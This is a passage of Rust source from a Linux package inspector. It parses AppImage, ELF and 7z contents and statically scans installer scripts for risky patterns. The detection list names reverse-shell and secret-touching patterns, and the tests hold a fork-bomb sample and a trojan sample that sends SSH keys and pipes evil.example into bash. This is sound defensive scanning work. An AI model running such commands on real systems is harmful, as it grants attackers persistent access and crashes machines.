    let n = file.read(&mut buf)?;
    if let Some(pos) = buf[..n].windows(4).position(|w| w == b"hsqs") {
        return Ok((pos as u64, has_sig_section));
    }
    Err(EasiError::AppImage(
        "could not locate SquashFS filesystem in AppImage".into(),
    ))
}

fn is_squashfs_at(file: &mut File, offset: u64) -> Result<bool, EasiError> {
    file.seek(SeekFrom::Start(offset))?;
    let mut magic = [0u8; 4];
    if file.read_exact(&mut magic).is_err() {
        return Ok(false);
    }
    Ok(&magic == b"hsqs")
}

fn check_elf_section_name(file: &mut File, hdr: &[u8; 64], target: &[u8]) -> Option<bool> {
    if &hdr[0..4] != b"\x7fELF" || hdr[4] != 2 || hdr[5] != 1 {
        return None;
    }
    let shoff = u64::from_le_bytes(hdr[40..48].try_into().ok()?);
    let shentsize = u16::from_le_bytes(hdr[58..60].try_into().ok()?) as u64;
    let shnum = u16::from_le_bytes(hdr[60..62].try_into().ok()?) as u64;
    let shstrndx = u16::from_le_bytes(hdr[62..64].try_into().ok()?) as u64;
    if shstrndx >= shnum || shentsize < 64 {
        return None;
    }
    let shstr_hdr_off = shoff.checked_add(shstrndx.checked_mul(shentsize)?)?;
    file.seek(SeekFrom::Start(shstr_hdr_off)).ok()?;
    let mut sh = [0u8; 64];
    file.read_exact(&mut sh).ok()?;
    let strtab_off = u64::from_le_bytes(sh[24..32].try_into().ok()?);
    let strtab_size = u64::from_le_bytes(sh[32..40].try_into().ok()?);
    if strtab_size > 256 * 1024 {
        return None;
    }
    file.seek(SeekFrom::Start(strtab_off)).ok()?;
    let mut strtab = vec![0u8; strtab_size as usize];
    file.read_exact(&mut strtab).ok()?;
    Some(strtab.windows(target.len()).any(|w| w == target))
}

/// Read a small ELF64 section's `(offset, size, bytes)` by section name (e.g. `.upd_info`, `.sha256_sig`).
fn read_elf_section_info(
    file: &mut File,
    hdr: &[u8; 64],
    target: &[u8],
) -> Option<(u64, u64, Vec<u8>)> {
    if &hdr[0..4] != b"\x7fELF" || hdr[4] != 2 || hdr[5] != 1 {
        return None;
    }
    let shoff = u64::from_le_bytes(hdr[40..48].try_into().ok()?);
    let shentsize = u16::from_le_bytes(hdr[58..60].try_into().ok()?) as u64;
    let shnum = u16::from_le_bytes(hdr[60..62].try_into().ok()?) as u64;
    let shstrndx = u16::from_le_bytes(hdr[62..64].try_into().ok()?) as u64;
    if shstrndx >= shnum || shentsize < 64 {
        return None;
    }
    let shstr_hdr_off = shoff.checked_add(shstrndx.checked_mul(shentsize)?)?;
    file.seek(SeekFrom::Start(shstr_hdr_off)).ok()?;
    let mut sh = [0u8; 64];
    file.read_exact(&mut sh).ok()?;
    let strtab_off = u64::from_le_bytes(sh[24..32].try_into().ok()?);
    let strtab_size = u64::from_le_bytes(sh[32..40].try_into().ok()?);
    if strtab_size > 256 * 1024 {
        return None;
    }
    file.seek(SeekFrom::Start(strtab_off)).ok()?;
    let mut strtab = vec![0u8; strtab_size as usize];
    file.read_exact(&mut strtab).ok()?;

    for i in 0..shnum {
        let off = shoff.checked_add(i.checked_mul(shentsize)?)?;
        file.seek(SeekFrom::Start(off)).ok()?;
        let mut sec = [0u8; 64];
        file.read_exact(&mut sec).ok()?;
        let name_off = u32::from_le_bytes(sec[0..4].try_into().ok()?) as usize;
        if name_off >= strtab.len() {
            continue;
        }
        let end = strtab[name_off..]
            .iter()
            .position(|&b| b == 0)
            .map(|p| name_off + p)
            .unwrap_or(strtab.len());
        if &strtab[name_off..end] == target {
            let sec_off = u64::from_le_bytes(sec[24..32].try_into().ok()?);
            let sec_size = u64::from_le_bytes(sec[32..40].try_into().ok()?);
            if sec_size > 64 * 1024 {
                return None;
            }
            file.seek(SeekFrom::Start(sec_off)).ok()?;
            let mut data = vec![0u8; sec_size as usize];
            file.read_exact(&mut data).ok()?;
            return Some((sec_off, sec_size, data));
        }
    }
    None
}

fn read_elf_section_bytes(file: &mut File, hdr: &[u8; 64], target: &[u8]) -> Option<Vec<u8>> {
    read_elf_section_info(file, hdr, target).map(|(_, _, b)| b)
}

fn list_appimage_type2(path: &Path) -> Result<PackageContents, EasiError> {
    let mut file = File::open(path)?;
    let (offset, has_sig_section) = find_appimage_squashfs_offset(&mut file)?;
    let (appimage_upd_info, appimage_sig_section) = {
        let mut hdr = [0u8; 64];
        if file.seek(SeekFrom::Start(0)).is_ok() && file.read_exact(&mut hdr).is_ok() {
            let upd = read_elf_section_bytes(&mut file, &hdr, b".upd_info").and_then(|bytes| {
                let text = String::from_utf8_lossy(&bytes)
                    .trim_matches(|c: char| c == '\0' || c.is_whitespace())
                    .to_string();
                if text.is_empty() { None } else { Some(text) }
            });
            let sig = read_elf_section_info(&mut file, &hdr, b".sha256_sig")
                .filter(|(_, _, b)| b.iter().any(|&x| x != 0));
            (upd, sig)
        } else {
            (None, None)
        }
    };
    let reader = BufReader::new(file);
    let fs = FilesystemReader::from_reader_with_offset(reader, offset)
        .map_err(|e| EasiError::AppImage(e.to_string()))?;

    let mut contents = PackageContents {
        has_appimage_sig_section: has_sig_section,
        appimage_sig_section,
        appimage_upd_info,
        ..Default::default()
    };

    let mut inspect_budget = LIMITS.inspect_total_bytes;
    for node in fs.files() {
        if contents.entries.len() >= LIMITS.archive_entries {
            return Err(EasiError::AppImage(format!(
                "AppImage exceeds maximum entry limit ({})",
                LIMITS.archive_entries
            )));
        }
        let rel = node
            .fullpath
            .to_string_lossy()
            .trim_start_matches('/')
            .to_string();
        if rel.is_empty() {
            continue;
        }
        match &node.inner {
            InnerNode::Dir(_) => {
                contents.entries.push(ArchiveEntry {
                    path: rel,
                    size: 0,
                    mode: u32::from(node.header.permissions),
                    is_dir: true,
                    is_symlink: false,
                    symlink_target: None,
                    is_elf: false,
                    elf_arch: None,
                    is_script: false,
                });
            }
            InnerNode::Symlink(sym) => {
                contents.entries.push(ArchiveEntry {
                    path: rel,
                    size: 0,
                    mode: u32::from(node.header.permissions),
                    is_dir: false,
                    is_symlink: true,
                    symlink_target: Some(sym.link.to_string_lossy().into_owned()),
                    is_elf: false,
                    elf_arch: None,
                    is_script: false,
                });
            }
            InnerNode::File(f) => {
                let size = f.file_len() as u64;
                if (is_desktop_path(&rel) || is_metainfo_path(&rel))
                    && size <= LIMITS.metadata_bytes
                {
                    let mut r = fs.file(f).reader();
                    if let Some(buf) =
                        read_bounded_bytes(&mut r, LIMITS.metadata_bytes, &mut inspect_budget)
                        && let Ok(text) = String::from_utf8(buf)
                    {
                        if is_desktop_path(&rel) {
                            contents.desktop_files.push((rel.clone(), text));
                        } else {
                            contents.metainfo_files.push((rel.clone(), text));
                        }
                    }
                } else if is_icon_path(&rel) && size <= LIMITS.icon_bytes {
                    let mut r = fs.file(f).reader();
                    if let Some(buf) =
                        read_bounded_bytes(&mut r, LIMITS.icon_bytes, &mut inspect_budget)
                    {
                        contents.embedded_icons.push((rel.clone(), buf));
                    }
                }
                contents.entries.push(ArchiveEntry {
                    path: rel,
                    size,
                    mode: u32::from(node.header.permissions),
                    is_dir: false,
                    is_symlink: false,
                    symlink_target: None,
                    is_elf: false,
                    elf_arch: None,
                    is_script: false,
                });
            }
            InnerNode::CharacterDevice(_)
            | InnerNode::BlockDevice(_)
            | InnerNode::NamedPipe
            | InnerNode::Socket => {}
        }
    }
    Ok(contents)
}

fn list_sevenz(path: &Path) -> Result<PackageContents, EasiError> {
    let mut reader = sevenz_rust::SevenZReader::open(path, sevenz_rust::Password::empty())
        .map_err(|e| EasiError::Archive(e.to_string()))?;
    let mut contents = PackageContents::default();
    let mut inspect_budget = LIMITS.inspect_total_bytes;
    reader
        .for_each_entries(|entry, data| {
            if contents.entries.len() >= LIMITS.archive_entries {
                return Err(sevenz_rust::Error::other(format!(
                    "archive exceeds maximum entry limit ({})",
                    LIMITS.archive_entries
                )));
            }
            let raw_path = entry.name().to_string();
            let size = entry.size();
            let is_dir = entry.is_directory();
            let mut is_elf = false;
            let mut elf_arch = None;
            let mut is_script = false;

            if !is_dir && size > 0 {
                if (is_desktop_path(&raw_path) || is_metainfo_path(&raw_path))
                    && size <= LIMITS.metadata_bytes
                {
                    if let Some(bytes) =
                        read_bounded_bytes(data, LIMITS.metadata_bytes, &mut inspect_budget)
                        && let Ok(text) = String::from_utf8(bytes)
                    {
                        if is_desktop_path(&raw_path) {
                            contents.desktop_files.push((raw_path.clone(), text));
                        } else {
                            contents.metainfo_files.push((raw_path.clone(), text));
                        }
                    }
                } else if is_meta_hint_path(&raw_path) && size <= LIMITS.metadata_bytes {
                    if let Some(bytes) =
                        read_bounded_bytes(data, LIMITS.metadata_bytes, &mut inspect_budget)
                        && let Ok(text) = String::from_utf8(bytes)
                    {
                        absorb_meta_hint(&mut contents, &raw_path, &text);
                    }
                } else if is_icon_path(&raw_path) && size <= LIMITS.icon_bytes {
                    if let Some(buf) =
                        read_bounded_bytes(data, LIMITS.icon_bytes, &mut inspect_budget)
                    {
                        contents.embedded_icons.push((raw_path.clone(), buf));
                    }
                } else {
                    let mut magic = [0u8; 20];
                    let n = data.read(&mut magic).unwrap_or(0);
                    is_elf = n >= 4 && &magic[..4] == b"\x7fELF";
                    elf_arch = elf_arch_from_header(&magic[..n]);
                    is_script = n >= 2 && &magic[..2] == b"#!";
                }
            }

            contents.entries.push(ArchiveEntry {
                path: raw_path,
                size,
                mode: if is_elf || is_script { 0o755 } else { 0o644 },
                is_dir,
                is_symlink: false,
                symlink_target: None,
                is_elf,
                elf_arch,
                is_script,
            });
            Ok(true)
        })
        .map_err(|e| EasiError::Archive(e.to_string()))?;
    Ok(contents)
}

fn parse_elf_package_note(file: &mut File) -> (Option<String>, Option<String>) {
    let mut hdr = [0u8; 64];
    if file.seek(SeekFrom::Start(0)).is_err() || file.read_exact(&mut hdr).is_err() {
        return (None, None);
    }
    let Some(bytes) = read_elf_section_bytes(file, &hdr, b".note.package") else {
        return (None, None);
    };
    // FreeDesktop/systemd ELF package note embeds a JSON object `{...}` inside the note descriptor.
    let text = String::from_utf8_lossy(&bytes);
    let Some(start) = text.find('{') else {
        return (None, None);
    };
    let Some(end) = text.rfind('}') else {
        return (None, None);
    };
    let json = &text[start..=end];
    let name = crate::self_update::extract_json_string_field(json, "name");
    let version = crate::self_update::extract_json_string_field(json, "version");
    (name, version)
}

fn list_single_executable(path: &Path) -> Result<PackageContents, EasiError> {
    let meta = std::fs::metadata(path)?;
    let (meta_name, meta_version, elf_arch) = File::open(path)
        .map(|mut f| {
            let mut hdr = [0u8; 20];
            let n = f.read(&mut hdr).unwrap_or(0);
            let arch = elf_arch_from_header(&hdr[..n]);
            let (nm, ver) = parse_elf_package_note(&mut f);
            (nm, ver, arch)
        })
        .unwrap_or((None, None, None));
    let name = path
        .file_name()
        .map(|n| n.to_string_lossy().into_owned())
        .unwrap_or_else(|| "app".into());
    Ok(PackageContents {
        entries: vec![ArchiveEntry {
            path: name,
            size: meta.len(),
            mode: 0o755,
            is_dir: false,
            is_symlink: false,
            symlink_target: None,
            is_elf: true,
            elf_arch,
            is_script: false,
        }],
        meta_name,
        meta_version,
        ..Default::default()
    })
}

struct ScriptRule {
    needles: &'static [&'static str],
    description: &'static str,
    obfuscation: bool,
}

/// Static capability/permission rules scanned in `.run` / `.sh` scripts before asking consent.
const SCRIPT_RULES: &[ScriptRule] = &[
    ScriptRule {
        needles: &["sudo ", "pkexec ", "doas ", "\nsu "],
        description: "requests administrator/root privileges (sudo/pkexec/su)",
        obfuscation: false,
    },
    ScriptRule {
        needles: &["curl ", "wget ", "http://", "https://", "nc "],
        description: "accesses the network (curl/wget/URL)",
        obfuscation: false,
    },
    ScriptRule {
        needles: &["/usr/", "/opt/", "/etc/", "/var/", "/lib/systemd"],
        description: "reads or writes system directories (/usr, /opt, /etc, /var)",
        obfuscation: false,
    },
    ScriptRule {
        needles: &["systemctl", "crontab", "autostart"],
        description: "registers background services or autostart entries",
        obfuscation: false,
    },
    ScriptRule {
        needles: &[".bashrc", ".zshrc", ".profile", "/etc/profile"],
        description: "modifies shell startup files (.bashrc/.zshrc/.profile)",
        obfuscation: false,
    },
    ScriptRule {
        needles: &["apt ", "apt-get ", "dnf ", "pacman ", "zypper ", "flatpak "],
        description: "invokes a system package manager",
        obfuscation: false,
    },
    ScriptRule {
        needles: &["rm -rf", "rm -r "],
        description: "recursively deletes files or directories (rm -rf)",
        obfuscation: false,
    },
    ScriptRule {
        needles: &["chmod +x", "chmod 7", "chmod +s", "chmod u+s", "chown "],
        description: "changes file permissions or ownership (chmod/chown)",
        obfuscation: false,
    },
    ScriptRule {
        needles: &[":(){", ":|:", "fork()"],
        description: "HIGH RISK: contains fork-bomb / rapid process-spawning pattern",
        obfuscation: true,
    },
    ScriptRule {
        needles: &[
            "| sh",
            "| bash",
            "|sh",
            "|bash",
            "/dev/tcp/",
            "mkfifo ",
            "socat ",
            "ncat ",
        ],
        description: "HIGH RISK: pipes remote data into a shell or opens raw sockets",
        obfuscation: true,
    },
    ScriptRule {
        needles: &[
            ".ssh/",
            ".gnupg/",
            "authorized_keys",
            "ld_preload",
            "ld.so.preload",
            "prompt_command",
        ],
        description: "HIGH RISK: touches SSH/GPG keys or shell/linker preload hooks",
        obfuscation: true,
    },
    ScriptRule {
        needles: &[
            "base64 -d",
            "base64 --decode",
            "eval ",
            "xxd -r",
            "openssl enc",
        ],
        description: "contains obfuscated/encoded commands (eval/base64 — exact actions hidden)",
        obfuscation: true,
    },
];

/// Statically analyze a `.run` / `.sh` installer script (first 128 KiB) without executing it.
pub fn analyze_shell_script(bytes: &[u8]) -> ScriptReport {
    let sample_len = bytes.len().min(128 * 1024);
    let sample = &bytes[..sample_len];
    let has_binary_payload = sample.contains(&0u8);
    let text = String::from_utf8_lossy(sample).to_ascii_lowercase();

    let mut actions = Vec::new();
    let mut obfuscated = has_binary_payload;

    for rule in SCRIPT_RULES {
        if rule.needles.iter().any(|n| text.contains(n)) {
            actions.push(rule.description.to_string());
            if rule.obfuscation {
                obfuscated = true;
            }
        }
    }

    if has_binary_payload {
        actions.push(
            "embeds a binary/compressed self-extracting payload (internal commands cannot be fully verified statically)"
                .into(),
        );
    }
    if actions.is_empty() {
        actions.push("runs shell commands in your user environment".into());
    }
    ScriptReport {
        actions,
        obfuscated,
    }
}

fn inspect_shell_installer(path: &Path) -> Result<PackageContents, EasiError> {
    let mut file = File::open(path)?;
    let meta = file.metadata()?;
    let mut sample = vec![0u8; (meta.len() as usize).min(128 * 1024)];
    let n = file.read(&mut sample)?;
    let report = analyze_shell_script(&sample[..n]);
    let name = path
        .file_name()
        .map(|s| s.to_string_lossy().into_owned())
        .unwrap_or_else(|| "installer.sh".into());
    Ok(PackageContents {
        entries: vec![ArchiveEntry {
            path: name,
            size: meta.len(),
            mode: 0o755,
            is_dir: false,
            is_symlink: false,
            symlink_target: None,
            is_elf: false,
            elf_arch: None,
            is_script: true,
        }],
        script_report: Some(report),
        ..Default::default()
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn capped_reads_refuse_content_past_the_cap() {
        // (content length, cap, accepted)
        let rows = [(0, 4, true), (4, 4, true), (5, 4, false), (4096, 16, false)];
        for (len, cap, accepted) in rows {
            let data = vec![b'x'; len];
            let got = read_capped(&mut data.as_slice(), cap);
            assert_eq!(got.is_some(), accepted, "len={len} cap={cap}");
        }
    }

    #[test]
    fn magic_byte_format_table() {
        let cases: &[(&str, &[u8], Option<Format>)] = &[
            (
                "appimage type 2",
                b"\x7fELF\x02\x01\x01\x00AI\x02\x00\x00\x00\x00\x00",
                Some(Format::AppImageType2),
            ),
            (
                "appimage type 1",
                b"\x7fELF\x02\x01\x01\x00AI\x01\x00\x00\x00\x00\x00",
                Some(Format::AppImageType1),
            ),
            (
                "plain elf is not appimage",
                b"\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00",
                None,
            ),
            ("gzip", &[0x1f, 0x8b, 0x08, 0x00], Some(Format::TarGz)),
            (
                "xz",
                &[0xfd, 0x37, 0x7a, 0x58, 0x5a, 0x00, 0x00],
                Some(Format::TarXz),
            ),
            (
                "zstd",
                &[0x28, 0xb5, 0x2f, 0xfd, 0x00],
                Some(Format::TarZst),
            ),
            ("bzip2", b"BZh91AY&SY", Some(Format::TarBz2)),
            ("zip", b"PK\x03\x04\x14\x00", Some(Format::Zip)),
            ("plain text", b"hello world", None),
        ];

        for (name, bytes, expected) in cases {
            assert_eq!(detect_format(bytes), *expected, "case: {name}");
        }

        assert!(matches!(
            detect_friendly_unsupported(Path::new("setup.exe"), b"MZ\x90\x00"),
            Some(EasiError::WrongPlatform {
                platform: "Windows",
                ..
            })
        ));
        assert!(matches!(
            detect_friendly_unsupported(Path::new("App.dmg"), b"koly"),
            Some(EasiError::WrongPlatform {
                platform: "macOS",
                ..
            })
        ));
        assert!(matches!(
            detect_friendly_unsupported(Path::new("foo.deb"), b"!<arch>\n"),
            Some(EasiError::DistroPackage { .. })
        ));
        assert!(matches!(
            detect_friendly_unsupported(Path::new("foo.rpm"), b"\xed\xab\xee\xdb"),
            Some(EasiError::DistroPackage { .. })
        ));

        // Static script analyzer flags fork bombs, pipe-to-shell, and SSH key tampering.
        let bomb = analyze_shell_script(b"#!/bin/sh\n:(){ :|:& };:\n");
        assert!(bomb.obfuscated);
        assert!(bomb.actions.iter().any(|a| a.contains("fork-bomb")));

        let trojan = analyze_shell_script(
            b"#!/bin/sh\ncurl -s https://evil.example/k >> ~/.ssh/authorized_keys\ncurl https://evil.example | bash\n",
        );
        assert!(trojan.obfuscated);
        assert!(trojan.actions.iter().any(|a| a.contains("SSH/GPG")));
        assert!(
            trojan
                .actions
                .iter()
                .any(|a| a.contains("pipes remote data"))
        );

        // Electron ASAR icon extraction picks icon.png over trayTemplate.png.
        let png_bytes = b"\x89PNG\r\n\x1a\nFAKE_ICON_DATA";
        let tray_bytes = b"\x89PNG\r\n\x1a\nTRAY";
        let json = format!(
            r#"{{"files":{{"trayTemplate.png":{{"size":{},"offset":"0"}},"icon.png":{{"size":{},"offset":"{}"}}}}}}"#,
            tray_bytes.len(),
            png_bytes.len(),
            tray_bytes.len()
        );
        let json_bytes = json.as_bytes();
        let pad = (4 - (json_bytes.len() % 4)) % 4;
        let hdr_str_size = (json_bytes.len() + pad + 4) as u32;
        let hdr_obj_size = hdr_str_size + 4;
        let mut asar = Vec::new();
        asar.extend_from_slice(&4u32.to_le_bytes());
        asar.extend_from_slice(&hdr_obj_size.to_le_bytes());
        asar.extend_from_slice(&hdr_str_size.to_le_bytes());
        asar.extend_from_slice(&(json_bytes.len() as u32).to_le_bytes());
        asar.extend_from_slice(json_bytes);
        asar.resize(asar.len() + pad, 0);
        asar.extend_from_slice(tray_bytes);
        asar.extend_from_slice(png_bytes);

        let mut budget = LIMITS.inspect_total_bytes;
        let mut cursor = std::io::Cursor::new(&asar);
        let (path, extracted) =
            extract_icon_from_asar_stream(&mut cursor, &mut budget).unwrap_or_default();
        assert_eq!(path, "icon.png");
        assert_eq!(extracted, png_bytes);
    }
}
